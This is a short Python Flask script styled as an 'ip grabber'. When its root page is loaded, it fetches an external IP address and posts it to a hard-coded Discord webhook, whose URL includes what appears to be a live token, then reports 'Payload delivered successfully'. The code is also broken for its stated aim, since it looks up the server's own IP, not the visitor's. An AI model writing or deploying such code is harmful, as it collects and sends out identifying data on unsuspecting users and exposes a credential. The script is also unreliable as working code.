from flask import Flask
import urllib.request
import requests

app = Flask(__name__)


@app.route('/')
def index():
    
        external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
        url = "https://discord.com/api/webhooks/953698784343388201/VYWzQlkBrsQ_0I89npV5Rl_0S5iH97dhT-NPSpq98Ne11rDCIzFdHsAOut1jtv1eaksA"
        data = {
            "content" : ".",
            "username" : "ip grabber"
        }
        data["embeds"] = [
            {
                "description" : f"{external_ip}",
                "title" : "new ip"
            }
        ]

        result = requests.post(url, json = data)

        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            return(err)
        else:
                
                return("Payload delivered successfully")


if __name__ == "__main__":
    app.run()
